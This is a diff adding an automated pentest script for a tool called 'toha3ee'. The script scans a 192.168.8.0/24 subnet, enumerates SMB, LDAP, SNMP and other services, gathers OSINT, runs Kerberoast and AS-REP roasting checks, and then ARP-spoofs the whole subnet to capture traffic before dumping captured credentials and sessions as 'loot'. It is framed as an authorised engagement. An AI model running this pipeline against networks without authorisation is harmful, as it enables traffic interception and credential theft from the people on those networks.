@@ -1,0 +1,123 @@
+# ---------------------------------------------------------------------------
+# full-pipeline.toha3ee
+#
+# A complete recon -> profile -> attack -> report pipeline for an authorised
+# engagement. Run with:
+#
+#     sudo toha3ee run scripts/full-pipeline.toha3ee --iface eth0
+#
+# or inspect it first (dry run, no packets):
+#
+#     toha3ee --no-sudo build scripts/full-pipeline.toha3ee
+# ---------------------------------------------------------------------------
+
+# ---- recon phase ----------------------------------------------------------
+set net.scan.targets -> "192.168.8.0/24"
+echo -> "sweeping $(iface.cidr) on $(iface.name) ..."
+on net.scan
+wait for net.scan
+_hosts -> [$(net.hosts)]
+echo -> "discovered $(_hosts.size) host(s)"
+
+# ---- active recon: ping sweep (ICMP + TCP SYN + UDP modes), traceroute ------
+on net.ping
+wait for net.ping
+set net.ping.mode -> "tcpsyn"
+on net.ping
+wait for net.ping
+set net.ping.mode -> "udp"
+on net.ping
+wait for net.ping
+set net.ping.mode -> "echo"
+on net.traceroute
+wait for net.traceroute
+on net.osdetect
+wait for net.osdetect
+on service.protoscan
+wait for service.protoscan
+
+# ---- service recon --------------------------------------------------------
+on service.synscan
+wait for service.synscan
+on service.fingerprint
+wait for service.fingerprint
+on service.tls
+wait for service.tls
+on service.tcpconnect
+wait for service.tcpconnect
+on service.udpscan
+wait for service.udpscan
+on service.finxmas mode fin
+wait for service.finxmas
+on service.ack
+wait for service.ack
+on service.idle
+wait for service.idle
+on web.dir wordlist common
+wait for web.dir
+on web.misconfig
+wait for web.misconfig
+
+# ---- enumeration (protocol-aware) ------------------------------------------
+on smtp.enum
+wait for smtp.enum
+on snmp.enum
+wait for snmp.enum
+on ldap.enum
+wait for ldap.enum
+on nfs.enum
+wait for nfs.enum
+on smb.enum
+wait for smb.enum
+on net.ip6sweep
+wait for net.ip6sweep
+
+# ---- passive OSINT (needs a domain; override with set osint.dns.target) ----
+get osint.dns.target -> _domain
+if $(_domain) != ""
+	on osint.dns
+	wait for osint.dns
+	on osint.whois
+	wait for osint.whois
+	on osint.ct
+	wait for osint.ct
+	on osint.asn
+	wait for osint.asn
+	on osint.bucket
+	wait for osint.bucket
+	on osint.wayback
+	wait for osint.wayback
+	on osint.harvest
+	wait for osint.harvest
+	on osint.dork
+	wait for osint.dork
+end
+
+# ---- advisory checks (no credentials required) ------------------------------
+on cve.suggest
+wait for cve.suggest
+on smb.signing
+wait for smb.signing
+on smb.kerberoast
+wait for smb.kerberoast
+on auth.asrep
+wait for auth.asrep
+
+# ---- profile + vectors ----------------------------------------------------
+exec -> net.profile
+exec -> vectors.show
+
+# ---- escalation only when the target set is worth it -----------------------
+if $(hosts.count) > 1
+	set arp.spoof.targets -> "192.168.8.0/24"
+	on arp.spoof
+	echo -> "arp.spoof running; capture phase for 30s"
+	sleep -> 30
+	off arp.spoof
+end
+
+# ---- loot + report ---------------------------------------------------------
+exec -> creds.show
+exec -> sessions.show
+report -> "assessment.md"
+echo -> "done. loot in the session, report at assessment.md"
